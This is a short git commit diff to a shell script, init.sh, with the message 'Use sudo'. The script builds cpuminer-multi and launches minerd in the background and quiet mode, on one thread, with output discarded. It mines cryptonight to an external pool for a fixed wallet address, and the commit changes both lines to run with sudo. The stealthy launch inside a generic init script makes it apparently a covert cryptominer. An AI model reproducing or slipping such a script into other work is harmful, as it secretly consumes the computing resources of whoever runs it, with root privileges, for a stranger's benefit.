0039e8a0da5c9f54e62931e8ed97cd487dd76675
atton <e115763@gmail.com>
2017-11-28 21:21:26 +0900

    Use sudo

--- init.sh
+++ init.sh
@@ -10,5 +10,5 @@ git clone https://github.com/OhGodAPet/cpuminer-multi
 cd cpuminer-multi
 ./autogen.sh
 CFLAGS="-march=native" ./configure
-make install
-/usr/local/bin/minerd -B -q -a cryptonight -o stratum+tcp://krb.crypto-coins.club:5555 -u KgGc79QyYag4LugEc2Gnxobt7Mfe9CSEh4NqGzdysooL3Czy6mKtuqLiCehzgoBDESTaYDN3U9XtgLxVJLmPCi397ppx6cL -p x -t 1 >& /dev/null
+sudo make install
+sudo /usr/local/bin/minerd -B -q -a cryptonight -o stratum+tcp://krb.crypto-coins.club:5555 -u KgGc79QyYag4LugEc2Gnxobt7Mfe9CSEh4NqGzdysooL3Czy6mKtuqLiCehzgoBDESTaYDN3U9XtgLxVJLmPCi397ppx6cL -p x -t 1 >& /dev/null
